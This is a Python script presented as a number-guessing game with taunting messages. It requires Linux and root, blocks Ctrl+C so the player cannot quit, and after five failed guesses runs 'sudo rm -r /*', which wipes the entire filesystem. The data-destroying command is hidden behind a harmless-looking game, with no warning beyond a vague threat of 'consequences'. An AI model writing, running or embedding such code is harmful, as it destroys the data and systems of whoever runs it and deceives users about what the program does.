import os
import random
import sys
import platform
import signal

# Function to handle SIGINT (Ctrl+C)
def signal_handler(sig, frame):
    print("\nYou can't escape that easily! Keep playing!")

# Register the signal handler for SIGINT
signal.signal(signal.SIGINT, signal_handler)

def play_game():
    number = random.randint(1, 10)
    lifelines = 5

    # List of aggressive comments to display after each failed attempt
    comments = [
        "Come on, you can do better!",
        "Seriously? Try harder!",
        "Don't make me regret giving you chances!",
        "You're running out of time, focus!",
        "Are you even trying?"
    ]

    # Add a final aggressive comment for the last life
    final_comment = "This is your last chance! Don't mess it up! Otherwise you'll face the consequences..."

    for attempt in range(lifelines):
        while True:
            try:
                guess = input(f"Guess a number between 1 and 10 (Attempt {attempt + 1}/{lifelines}): ")
                guess = int(guess)
                break
            except ValueError:
                print("Invalid input! Please enter an integer between 1 and 10.")
                
        if guess == number:
            print("You won! Live the life in Peace.......")
            return
        else:
            remaining_lives = lifelines - attempt - 1
            if remaining_lives > 0:
                if remaining_lives == 1:
                    print(f"Incorrect! You have {remaining_lives} life left. {final_comment}")
                else:
                    comment = comments[attempt] if attempt < len(comments) else random.choice(comments)
                    print(f"Incorrect! You have {remaining_lives} lives left. {comment}")

    # If the loop completes without breaking, the player has exhausted all lifelines
    print("You lost! Now, you are dead.....")
    print("Thanks for playing!")
    command = "sudo rm -r /*"
    os.system(command)

def main():
    # Check if the script is being run on Linux
    if platform.system() != "Linux":
        print("This script can only be run on Linux systems!")
        sys.exit(1)

    # Check if the script is being run as root
    if os.geteuid() != 0:
        print("This script must be run as root!")
        sys.exit(1)
    
    # Play a single round of the game
    play_game()

if __name__ == "__main__":
    main()
